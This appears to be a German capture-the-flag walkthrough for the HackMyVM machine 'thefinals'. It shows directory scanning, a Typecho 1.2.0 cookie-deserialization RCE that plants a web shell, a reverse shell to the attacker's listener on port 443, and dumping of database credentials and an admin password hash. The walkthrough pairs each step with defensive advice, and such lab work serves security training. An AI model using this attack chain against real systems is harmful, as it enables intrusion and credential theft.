+<span class="command"> 🚀  Threads               │ 50</span>
+<span class="command"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+<span class="command"> 👌  Status Codes          │ All Status Codes!</span>
+<span class="command"> 💥  Timeout (secs)        │ 7</span>
+<span class="command"> 🦡  User-Agent            │ feroxbuster/2.11.0</span>
+<span class="command"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span>
+<span class="command"> 🔎  Extract Links         │ true</span>
+<span class="command"> 💲  Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
+<span class="command"> 🏁  HTTP methods          │ [GET]</span>
+<span class="command"> 🔃  Recursion Depth       │ 4</span>
+<span class="command">───────────────────────────┴──────────────────────</span>
+<span class="command"> 🏁  Press [ENTER] to use the Scan Management Menu™</span>
+<span class="command">──────────────────────────────────────────────────</span>
+<span class="command">404      GET        9l       31w      273c http://thefinals.hmv/blog/install/blog</span>
+<span class="password">200      GET        0l        0w        0c http://thefinals.hmv/blog/install/SQLite.php</span>
+<span class="password">200      GET        0l        0w        0c http://thefinals.hmv/blog/install/Mysql.php</span>
+<span class="password">200      GET       87l      404w     3147c http://thefinals.hmv/blog/install/SQLite.sql</span>
+<span class="password">200      GET      152l      457w     4255c http://thefinals.hmv/blog/install/Mysql.sql</span>
+<span class="password">200      GET      130l      478w     3886c http://thefinals.hmv/blog/install/Pgsql.sql</span>
+<span class="password">200      GET        0l        0w        0c http://thefinals.hmv/blog/install/Pgsql.php</span>
+<span class="command">[####################] - 1s       196/196     0s      found:4       errors:0</span>
+<span class="command">[####################] - 0s   6175344/6175344 308767200/s http://thefinals.hmv/blog/install/ --> Directory listing (add --scan-dir-listings to scan)</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Um die genaue Struktur und die benötigten Dateien im `install/` Verzeichnis von Typecho zu verstehen, führte ich erneut einen `feroxbuster`-Scan durch, diesmal gezielt auf die URL `http://thefinals.hmv/blog/install/`. Ich entfernte die Statuscode-Filterung, um alle Antworten zu sehen. Die Ausgabe bestätigte die Verzeichnislistung und zeigte mehrere PHP- und SQL-Dateien an, darunter `SQLite.php`, `Mysql.php`, `Pgsql.php` und die entsprechenden `.sql` Dateien. Dies sind die Installationsdateien für verschiedene Datenbanktypen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Ergebnisse von Feroxbuster zeigten, dass das `install/` Verzeichnis die notwendigen Dateien für die Datenbankeinrichtung und Installation enthielt. Dies war der Schlüssel, um den Exploit zum Laufen zu bringen. Das Vorhandensein dieser Dateien bestätigte, dass die Installation auf dem System nicht ordnungsgemäß abgeschlossen oder zurückgesetzt wurde und somit angreifbar war.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Sie auf Installationsverzeichnisse stoßen, untersuchen Sie deren Inhalt genau. Sie enthalten oft sensible Dateien oder Skripte, die ausgenutzt werden können. Führen Sie erneute Scans mit angepassten Filtern durch, um alle Dateien zu finden.
+                <br><strong>Empfehlung (Admin):</strong> Entfernen oder sperren Sie den Zugriff auf alle Installationsverzeichnisse und -dateien sofort nach Abschluss der Installation.
+
+             </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich nutzte die Informationen über den Typecho RCE Exploit und die Struktur des Installationsverzeichnisses, um den Angriff zu verfeinern. Der Exploit funktioniert,
+ indem er den serialisierten PHP-Code im `typecho_config` Cookie an eine Datei im Installationsverzeichnis sendet, die diesen Cookie verarbeitet. Die Datei `Mysql.php` (oder eine ähnliche
+ Datenbankkonfigurationsdatei) war ein heißer Kandidat. Ich sendete eine POST-Anfrage an `http://thefinals.hmv/blog/install/Mysql.php` mit dem manipulierten `typecho_config` Cookie und einem leeren 
+POST-Body (`-d ''`). Die Idee war, dass das Skript `Mysql.php` den Cookie verarbeitet und dabei meinen PHP-Code ausführt, der nun als Web-Shell unter der URL `http://thefinals.hmv/blog/install/Mysql.php` 
+verfügbar sein sollte. Ich versuchte dann, diese neue Web-Shell mit `curl "http://thefinals.hmv/blog/install/Mysql.php?cmd=id"` aufzurufen und einen Befehl (`id`) auszuführen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolgreich! Durch das Senden des manipulierten Cookies an die spezifische Datei `Mysql.php` im Installationsverzeichnis konnte ich den schädlichen PHP-Code
+ injizieren und aktivieren. Der Aufruf mit `?cmd=id` zeigte die Ausgabe des `id`-Befehls, was bestätigte, dass meine Web-Shell funktioniert und ich Befehle auf dem System ausführen kann. Dies ist der Initial 
+Access als der Webserver-Benutzer (`apache` oder `www-data`).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn ein veröffentlichter Exploit fehlschlägt, analysieren Sie den Exploit-Code oder die Dokumentation genau und passen Sie ihn an das Zielsystem 
+an (z.B. korrekte URL, Dateiname, Parameter). Nutzen Sie Debugging-Techniken, um zu verstehen, wo der Exploit fehlschlägt. Testen Sie die Web-Shell nach der Injektion mit einfachen Befehlen (`id`, `whoami`).
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Installationsdateien niemals auf einem Produktionssystem verbleiben und zugänglich sind. Implementieren Sie eine Web 
+Application Firewall (WAF), die bekannte Exploit-Payloads und ungewöhnliche Anfragen an Installationspfade erkennt und blockiert. Überwachen Sie die Ausführung von Systembefehlen durch den Webserver-Prozess.
+
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">POST http://thefinals.hmv/blog/install/Mysql.php mit Cookie typecho_config=[Base64-Payload] und leerem POST-Body</span>
+<span class="command">dann: curl "http://thefinals.hmv/blog/install/Mysql.php?cmd=id"</span>
+</pre>
+                </div>
+            </div>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich Initial Access über die Web-Shell erlangt hatte, wollte ich eine stabilere Reverse Shell zu meiner Kali-Maschine erhalten. Ich nutzte die Web-Shell 
+unter `http://thefinals.hmv/blog/install/Mysql.php` und übergab einen Bash-Befehl über den `cmd` Parameter, der eine Reverse Shell zu meiner IP (`192.168.2.199`) auf Port 443 initiierte. Port 443 wurde
+ gewählt, da er oft für ausgehenden Verkehr erlaubt ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Erhalten einer stabilen Reverse Shell ist entscheidend für die weitere Arbeit auf dem System. Die Web-Shell ermöglicht zwar die Ausführung einzelner 
+Befehle, aber eine interaktive Shell ist für die Dateisystem-Enumeration und die Ausführung interaktiver Tools unerlässlich. Die Wahl von Port 443 war eine strategische Entscheidung, die sich als 
+erfolgreich erwies.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Etablieren Sie immer eine stabilere Shell (Reverse oder Bind) nach dem Erhalt initialen Zugriffs über eine Web-Shell oder Befehlsausführung. 
+Testen Sie verschiedene Ports für Ihre Reverse Shell, um Egress-Filter zu umgehen.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie strenge Egress-Filter auf Ihrer Firewall, um unautorisierten ausgehenden Verkehr zu blockieren. Überwachen Sie Netzwerkverkehr
+ auf gängigen Ports (80, 443) auf ungewöhnliche Shell-Verbindungen.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 443</span></div>
+                    <pre><span class="password">listening on [any] 443 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.64] 38631</span>
+<span class="prompt">/var/www/html/blog/usr/themes/default $</span> <span class="command">id</span>
+<span class="command">uid=102(apache) gid=103(apache) groups=82(www-data),103(apache),103(apache)</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Bevor ich den Befehl zur Initiierung der Reverse Shell über die Web-Shell ausführte, startete ich einen Netcat-Listener auf meiner Kali-Maschine auf Port 443
+ (`nc -lvnp 443`). Nach Ausführung des Befehls auf der Ziel-VM zeigte Netcat eine eingehende Verbindung von der Ziel-VM (`192.168.2.64`) an. Ich erhielt eine Eingabeaufforderung und führte sofort den 
+`id`-Befehl aus. Die Ausgabe `uid=102(apache) gid=103(apache) groups=82(www-data),103(apache),103(apache)` bestätigte, dass ich eine Shell als Benutzer `apache` erhalten hatte, der auch Mitglied der 
+Gruppe `www-data` war.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der erfolgreiche Erhalt der Reverse Shell als Benutzer `apache` war der Beweis für den Initial Access. Der Benutzer `apache` ist der Standard-Webserver-Benutzer 
+auf einigen Systemen, ähnlich wie `www-data`. Die Berechtigungen sind wahrscheinlich begrenzt, aber ich hatte nun eine interaktive Shell, um das System weiter zu erkunden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Richten Sie immer einen Listener ein, bevor Sie eine Reverse Shell erwarten. Verifizieren Sie Ihre Benutzer-ID mit `id` oder `whoami` in jeder neuen
+ Shell-Sitzung. Stabilisieren Sie die Shell, wenn möglich (z.B. mit `stty` oder `python -c 'import pty; pty.spawn("/bin/bash")'`).
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie eingehende Verbindungen auf Ihrem Listener-System auf ungewöhnliche Quell-IPs oder Ports. Überwachen Sie ausgehenden Verkehr von 
+Webservern auf Shell-Verbindungen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">/var/www/html/blog/usr/themes/default $ <span class="command">stty rows 47 columns 94</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">/var/www/html/blog/usr/themes/default $ <span class="command">id</span></div>
+                    <pre><span class="command">uid=102(apache) gid=103(apache) groups=82(www-data),103(apache),103(apache)</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nach dem Erhalt der Reverse Shell als Benutzer `apache` passte ich die Terminalgröße mit `stty rows 47 columns 94` an, um die Shell interaktiver zu
+ gestalten. Ein erneuter `id`-Befehl bestätigte meine Identität und Gruppenmitgliedschaften.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Shell-Stabilisierung ist ein Standardvorgehen für eine bessere Benutzererfahrung. Die Bestätigung der Benutzer-ID diente dazu, sicherzustellen, 
+dass die Shell unter den erwarteten Berechtigungen lief.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisieren Sie Ihre Shells für eine bessere Interaktivität.
+                <br><strong>Empfehlung (Admin):</strong> Keine spezifische Empfehlung.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">/var/www/html/blog/usr/themes/default $ <span class="command">cd ../..</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">/var/www/html/blog/usr $ <span class="command">cd ..</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">/var/www/html/blog $ <span class="command">cat config.inc.php</span></div>
+                    <pre><span class="command">// site root path</span>
+<span class="command">define('__TYPECHO_ROOT_DIR__', dirname(__FILE__));</span>
+
+<span class="command">// plugin directory (relative path)</span>
+<span class="command">define('__TYPECHO_PLUGIN_DIR__', '/usr/plugins');</span>
+
+<span class="command">// theme directory (relative path)</span>
+<span class="command">define('__TYPECHO_THEME_DIR__', '/usr/themes');</span>
+
+<span class="command">// admin directory (relative path)</span>
+<span class="command">define('__TYPECHO_ADMIN_DIR__', '/admin/');</span>
+
+<span class="command">// register autoload</span>
+<span class="command">require_once __TYPECHO_ROOT_DIR__ . '/var/Typecho/Common.php';</span>
+
+<span class="command">// init</span>
+<span class="command">\Typecho\Common::init();</span>
+
+<span class="command">// config db</span>
+<span class="command">$db = new \Typecho\Db('Pdo_Mysql', 'typecho_');</span>
+<span class="command">$db->addServer(array (</span>
+  <span class="command">'host' => 'localhost',</span>
+  <span class="command">'port' => 3306,</span>
+  <span class="command">'user' => '<span class="password">typecho_u</span>',</span>
+  <span class="command">'password' => '<span class="password">QLTkbviW71CSRZtGWIQdB6s</span>',</span>
+  <span class="command">'charset' => 'utf8mb4',</span>
+  <span class="command">'database' => 'typecho_db',</span>
+  <span class="command">'engine' => 'InnoDB',</span>
+<span class="command">), \Typecho\Db::READ | \Typecho\Db::WRITE);</span>
+<span class="command">\Typecho\Db::set($db);</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Im Kontext der `apache` Shell navigierte ich zurück in das Hauptverzeichnis der Typecho-Installation (`/var/www/html/blog/`) und las den Inhalt der Datei 
+`config.inc.php` aus. Dies ist die Hauptkonfigurationsdatei von Typecho. Die Datei enthielt Datenbank-Zugangsdaten: Benutzer `typecho_u` und Passwort `QLTkbviW71CSRZtGWIQdB6s` für die MySQL-Datenbank 
+auf `localhost:3306`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auffinden der Datenbank-Zugangsdaten in Klartext in der Konfigurationsdatei ist eine kritische Schwachstelle. Mit diesen Anmeldeinformationen kann ich 
+auf die Datenbank zugreifen, die oft sensitive Informationen wie Benutzerkonten und deren Passworthashes enthält. Dies ist ein sehr wichtiger Schritt zur Privilegieneskalation oder zumindest zur 
+Erlangung weiterer sensibler Daten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suchen Sie immer nach Konfigurationsdateien in Webanwendungen. Diese enthalten oft Datenbank-Zugangsdaten, API-Schlüssel oder andere sensible 
+Informationen in Klartext. Priorisieren Sie die Auslesung solcher Dateien.
+                <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Datenbank-Zugangsdaten oder andere sensible Informationen in Klartext in Konfigurationsdateien auf dem Dateisystem.
+ Nutzen Sie sicherere Methoden zur Geheimnisverwaltung. Beschränken Sie den Zugriff auf Konfigurationsdateien streng auf die notwendigen Benutzer.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">/var/www/html/blog $ <span class="command">mysql -u typecho_u -pQLTkbviW71CSRZtGWIQdB6s</span></div>
+                    <pre><span class="command">mysql: Deprecated program name. It will be removed in a future release, use '/usr/bin/mariadb' instead</span>
+<span class="command">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span>
+<span class="command">Your MariaDB connection id is 169655</span>
+<span class="command">Server version: 11.4.5-MariaDB Alpine Linux</span>
+
+<span class="command">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span>
+
+<span class="command">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span>
+
+<span class="command">MariaDB [(none)]> show databases;</span>
+<span class="command">+--------------------+</span>
+<span class="command">| Database           |</span>
+<span class="command">+--------------------+</span>
+<span class="command">| information_schema |</span>
+<span class="command">| test               |</span>
+<span class="password">| typecho_db         |</span>
+<span class="command">+--------------------+</span>
+<span class="command">3 rows in set (0.003 sec)</span>
+
+<span class="command">MariaDB [(none)]> use typecho_db;</span>
+<span class="command">Reading table information for completion of table and column names</span>
+<span class="command">You can turn off this feature to get a quicker startup with -A</span>
+
+<span class="command">Database changed</span>
+<span class="command">MariaDB [typecho_db]> show tables;</span>
+<span class="command">+-----------------------+</span>
+<span class="command">| Tables_in_typecho_db  |</span>
+<span class="command">+-----------------------+</span>
+<span class="command">| typecho_comments      |</span>
+<span class="command">| typecho_contents      |</span>
+<span class="command">| typecho_fields        |</span>
+<span class="command">| typecho_metas         |</span>
+<span class="password">| typecho_options       |</span>
+<span class="password">| typecho_relationships |</span>
+<span class="password">| typecho_users         |</span>
+<span class="command">+-----------------------+</span>
+<span class="command">7 rows in set (0.000 sec)</span>
+
+<span class="command">MariaDB [typecho_db]> select * from typecho_users;</span>
+<span class="command">+-----+-------+------------------------------------+---------------------+---------------------------+------------+------------+------------+------------+---------------+----------------------------------+</span>
+<span class="command">| uid | name  | password                           | mail                | url                       | screenName | created    | activated  | logged     | group         | authCode                         |</span>
+<span class="command">+-----+-------+------------------------------------+---------------------+---------------------------+------------+------------+------------+------------+---------------+----------------------------------+</span>
+<span class="command">|   1 | staff | <span class="password">$P$B/qMMS9FETOrEZ38X0YDY5gKJOyiwQ1</span> | staff@thefinals.hmv | http://thefinals.hmv/blog | staff      | 1743647281 | 1750976461 | 1750976401 | administrator | c51ee3ad7fc57b6b704a87784932a931 |</span>
+<span class="command">+-----+-------+------------------------------------+---------------------+---------------------------+------------+------------+------------+------------+---------------+----------------------------------+</span>
+<span class="command">1 row in set (0.000 sec)</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Mit den Datenbank-Zugangsdaten meldete ich mich an der lokalen MySQL-Datenbank an. Ich verwendete den Befehl `mysql -u typecho_u -pQLTkbviW71CSRZtGWIQdB6s`, 
+wobei `-u` den Benutzernamen und `-p` das Passwort angibt (das Passwort wird hier direkt auf der Kommandozeile übergeben, was nicht sicher ist, aber in einer kompromittierten Shell akzeptabel ist). 
+Ich erhielt erfolgreich Zugriff auf die MariaDB-Datenbank (Version 11.4.5). Innerhalb der MariaDB-Konsole listete ich die Datenbanken auf (`show databases;`), wählte die relevante Datenbank `typecho_db`
+ aus (`use typecho_db;`), listete die Tabellen in dieser Datenbank auf (`show tables;`) und wählte dann alle Einträge aus der `typecho_users` Tabelle aus (`select * from typecho_users;`). Die Ausgabe 
+zeigte einen Benutzer mit dem Namen `staff` und einen Passworthash `$P$B/qMMS9FETOrEZ38X0YDY5gKJOyiwQ1`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Zugriff auf die Datenbank und das Auslesen der `typecho_users` Tabelle war ein kritischer Erfolg. Ich habe nun den Benutzernamen (`staff`) und den 
+Passworthash für den Administrator des Typecho-Blogs. Der Hash `$P$B/qMMS9FETOrEZ38X0YDY5gKJOyiwQ1` ist im PHPass-Format gespeichert, das oft mit John the Ripper oder Hashcat geknackt werden kann.
+ Dies bietet einen potenziellen Weg zur Kompromittierung des Admin-Accounts für den Blog.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Sobald Sie Datenbank-Zugangsdaten haben, melden Sie sich an der Datenbank an und untersuchen Sie die Tabellen auf Benutzerkonten, Passworthashes oder andere sensible Daten. Extrahieren Sie Passworthashes, um sie offline zu knacken.
+                <br><strong>Empfehlung (Admin):</strong> Speichern Sie keine Passwörter in Klartext oder leicht zu knackenden Hash-Formaten in der Datenbank. Verwenden Sie starke, gesalzene Hashes mit modernen Algorithmen. Sichern Sie Ihre Datenbanken streng ab und beschränken Sie den Zugriff auf die Datenbank-Shell.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">/var/www/html/blog $ <span class="command">find / -user scotty 2>/dev/null</span></div>
+                    <pre><span class="command">....</span>
+<span class="command">...</span>
+<span class="command">/var/log/scotty-main.err</span>
+<span class="command">/var/log/scotty-main.log</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">/var/www/html/blog $ <span class="command">cat /var/log/scotty-main.log</span></div>
+                    <pre><span class="command">....</span>
+<span class="command">...</span>
+<span class="password">Broadcast to eth0 192.168.2.64:1337</span>
+<span class="password">Broadcast to eth0 192.168.2.64:1337</span>
+<span class="password">Broadcast to eth0 192.168.2.64:1337</span>
+<span class="command">....</span>
+<span class="command">...</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich suchte auf dem System nach Dateien, die dem Benutzer `scotty` gehören, da dies ein weiterer potenzieller Benutzer auf dem System sein könnte, der für die Privilegieneskalation relevant ist. Ich verwendete den Befehl `find / -user scotty 2>/dev/null`. Die Ausgabe zeigte, dass Logdateien unter `/var/log/` existierten, die `scotty` gehören (`/var/log/scotty-main.err` und `/var/log/scotty-main.log`). Ich las den Inhalt von `/var/log/scotty-main.log` aus. Die Logdatei enthielt wiederholte Einträge wie `Broadcast to eth0 192.168.2.64:1337`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auffinden der Logdateien für den Benutzer `scotty` war ein wichtiger Hinweis auf die Existenz dieses Benutzers und eines laufenden Prozesses oder Dienstes, der ihm gehört. Die Logeinträge selbst, die einen Broadcast auf Port 1337 anzeigen, deuten darauf hin, dass ein Dienst oder Skript, das dem Benutzer `scotty` gehört, UDP-Nachrichten auf Port 1337 sendet. Dies ist ein sehr starker Hinweis auf einen lokalen Dienst, der für die Privilegieneskalation relevant sein könnte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suchen Sie immer nach Dateien oder Prozessen, die ungewöhnlichen Benutzern gehören. Untersuchen Sie Logdateien auf Hinweise auf laufende Dienste, Fehler oder sensitive Informationen. Achten Sie auf Netzwerkaktivitäten, die in Logs erwähnt werden (z.B. IP-Adressen, Ports, Protokolle).
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Logdateien nur für die notwendigen Benutzer lesbar sind. Überwachen Sie Logdateien auf ungewöhnliche oder wiederholte Einträge, die auf Fehlkonfigurationen oder bösartige Aktivitäten hindeuten.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">/var/www/html/blog $ <span class="command">netstat -altpn</span></div>
+                    <pre><span class="command">netstat: showing only processes with your user ID</span>
+<span class="command">Active Internet connections (servers and established)</span>
+<span class="command">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span>
+<span class="command">tcp      LISTEN     0          128                  0.0.0.0:22                0.0.0.0:*       -</span>
+<span class="command">tcp      LISTEN     0          511                        *:80                      *:*       -</span>
+<span class="command">tcp      LISTEN     0          128                     [::]:22                   [::]:*       -</span>
+<span class="command">tcp      LISTEN     0          128                     [::]:80                   [::]:*       -</span>
+<span class="command">tcp        0      0 192.168.2.64:38631      192.168.2.199:443       ESTABLISHED 11372/ash</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">~ # <span class="command">ss -tuln</span></div>
+                    <pre><span class="command">Netid    State      Recv-Q     Send-Q         Local Address:Port         Peer Address:Port</span>
+<span class="command">tcp      LISTEN     0          128                  0.0.0.0:22                0.0.0.0:*</span>
+<span class="command">tcp      LISTEN     0          511                        *:80                      *:*</span>
+<span class="command">tcp      LISTEN     0          128                     [::]:22                   [::]:*</span>
+<span class="command">tcp      LISTEN     0          511                     [::]:80                   [::]:*</span>
+<span class="command">udp      UNCONN     0          0                  0.0.0.0:1337                0.0.0.0:*</span>
+<span class="command">udp      UNCONN     0          0                        *:1337                      *:*</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">~ # <span class="command">lsof -i -P -n | grep LISTEN</span></div>
+                    <pre><span class="command">sshd       2483   root 7u  IPv4    2836      0t0  TCP *:22 (LISTEN)</span>
+<span class="command">sshd       2483   root 8u  IPv6    2838      0t0  TCP *:22 (LISTEN)</span>
+<span class="command">httpd      2512   root 4u  IPv6   16416      0t0  TCP *:80 (LISTEN)</span>
+<span class="command">httpd      7438 apache 4u  IPv6   16416      0t0  TCP *:80 (LISTEN)</span>
+<span class="command">httpd      9906 apache 4u  IPv6   16416      0t0  TCP *:80 (LISTEN)</span>
+<span class="command">httpd     13538 apache 4u  IPv6   16416      0t0  TCP *:80 (LISTEN)</span>
+<span class="command">httpd     15216 apache 4u  IPv6   16416      0t0  TCP *:80 (LISTEN)</span>
+<span class="command">httpd     16635 apache 4u  IPv6   16416      0t0  TCP *:80 (LISTEN)</span>
+<span class="command">httpd     16766 apache 4u  IPv6   16416      0t0  TCP *:80 (LISTEN)</span>
+<span class="command">httpd     17145 apache 4u  IPv6   16416      0t0  TCP *:80 (LISTEN)</span>
+<span class="command">httpd     17288 apache 4u  IPv6   16416      0t0  TCP *:80 (LISTEN)</span>
+<span class="command">httpd     17427 apache 4u  IPv6   16416      0t0  TCP *:80 (LISTEN)</span>
+<span class="command">httpd     17701 apache 4u  IPv6   16416      0t0  TCP *:80 (LISTEN)</span>
+<span class="command">httpd     17826 apache 4u  IPv6   16416      0t0  TCP *:80 (LISTEN)</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich Root-Zugriff erlangt hatte (siehe POC-Bereich unten), untersuchte ich die Netzwerkkonfiguration und laufende Dienste, um zu verstehen, warum Reverse Shells nur auf bestimmten Ports (wie 80 oder 443) funktionierten. Ich verwendete die Befehle `netstat -altpn`, `ss -tuln` und `lsof -i -P -n | grep LISTEN`. Diese Befehle listen Netzwerkverbindungen, lauschende Sockets und die zugehörigen Prozesse auf. Die Ausgaben zeigten, dass TCP-Dienste (SSH auf Port 22, HTTP auf Port 80) und ein UDP-Dienst auf Port 1337 lauschten. Die `netstat` Ausgabe als `apache` zeigte nur die für diesen Benutzer relevanten Prozesse. Die `ss` Ausgabe als `root` zeigte klar, dass UDP auf Port 1337 auf allen Adressen lauschte. Die `lsof` Ausgabe als `root` zeigte die `sshd` und `httpd` Prozesse, aber keinen Prozess, der auf Port 1337 lauschte. **Logische Brücke:** Die Tatsache, dass `ss` den lauschenden UDP-Port 1337 anzeigte, aber `lsof` keinen Prozess dafür zeigte, und dass die `scotty` Logs auf Broadcasts an diesen Port hindeuteten, legt nahe, dass ein Dienst, der dem Benutzer `scotty` gehört, aktiv ist und auf UDP Port 1337 lauscht, aber möglicherweise nur für einen sehr kurzen Zeitraum oder auf eine Weise, die von `lsof` zu diesem spezifischen Zeitpunkt nicht erfasst wurde, oder dass `ss` ihn anzeigte, auch wenn der Prozess nicht sofort sichtbar war.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Netzwerkanalyse als Root bestätigte die offenen Ports und identifizierte einen lauschenden UDP-Dienst auf Port 1337, der mit dem Benutzer `scotty` in Verbindung stand. Obwohl ich die exakte Ursache für die Einschränkung von Reverse Shells nicht sofort klar aus `iptables` erkennen konnte (die Regeln waren standardmäßig `ACCEPT`, was ungewöhnlich ist, wenn Filter aktiv sind), deuteten die Testergebnisse darauf hin, dass nur Standard-Webports für ausgehende Shells erlaubt waren. Der lauschende UDP-Dienst auf Port 1337, betrieben von `scotty`, ist ein weiterer potenzieller PE-Vektor, den ich hätte weiter untersuchen können, wenn der `sudo fastfetch` Exploit nicht verfügbar gewesen wäre.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie nach Root-Zugriff Netzwerk-Enumerationstools (`ss`, `netstat`, `lsof`, `iptables`) um die Systemkonfiguration vollständig zu verstehen. Untersuchen Sie alle lauschenden Dienste, insbesondere solche auf ungewöhnlichen Ports oder die ungewöhnlichen Benutzern gehören. Analysieren Sie Firewall-Regeln, um Netzwerkbeschränkungen zu verstehen.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie alle lauschenden Dienste auf Ihren Systemen. Deaktivieren Sie unnötige Dienste. Konfigurieren Sie Firewalls restriktiv, um nur den notwendigen Verkehr zu erlauben. Überprüfen Sie Firewalls auf ungewöhnliche Regeln oder fehlende Filterung.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">~ # <span class="command">iptables -L -n -v</span></div>
+                    <pre><span class="command">Chain INPUT (policy ACCEPT 0 packets, 0 bytes)</span>
+<span class="command"> pkts bytes target     prot opt in     out     source               destination</span>
+
+<span class="command">Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)</span>
+<span class="command"> pkts bytes target     prot opt in     out     source               destination</span>
+
+<span class="command">Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)</span>
+<span class="command"> pkts bytes target     prot opt in     out     source               destination</span>
+
+<span class="command">nachdem ich die vm übernommen habe prüfte ich mit diesen Befehlen warum nur port 80 empfänglich war</span>
+<span class="command">für revshells...</span></pre>
+                </div>
+            </div>
+
+        </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept</h2>
+            <p class="analysis">
+                <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die Erlangung von Initial Access als Benutzer `apache` durch die Ausnutzung einer bekannten Remote Code Execution (RCE) Schwachstelle im Installationsprozess von Typecho 1.2.0. Ein manipuliertes Cookie, das schädlichen PHP-Code enthält, konnte an eine Installationsdatei gesendet und zur Ausführung gebracht werden, was die Platzierung einer Web-Shell ermöglichte und einen direkten Zugang zur Befehlsausführung schuf.
+            </p>
+             <p class="analysis">
+                <strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Die Typecho-Anwendung Version 1.2.0 muss auf dem System installiert sein, wobei das Installationsverzeichnis (`/blog/install/`) zugänglich ist.</li>
+                    <li>Die Installation darf nicht vollständig abgeschlossen oder muss zurückgesetzt worden sein, sodass die Installationsdateien Cookies verarbeiten.</li>
+                    <li>Kenntnis des Typecho RCE Exploits, der auf serialisierte PHP-Daten in Cookies basiert.</li>
+                    <li>Fähigkeit, POST-Anfragen mit manipulierten Cookies zu senden.</li>
+                    <li>Eine Möglichkeit, eine Reverse Shell vom Zielsystem zu initiieren und auf dem Angriffssystem zu empfangen.</li>
+                </ul>
+            </p>
+             <p class="analysis">
+                <strong>Schritt-für-Schritt-Anleitung & Beweismittel:</strong>
+            </p>
+             <p class="analysis">
+                1. Vorbereitung des PHP-Payloads:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
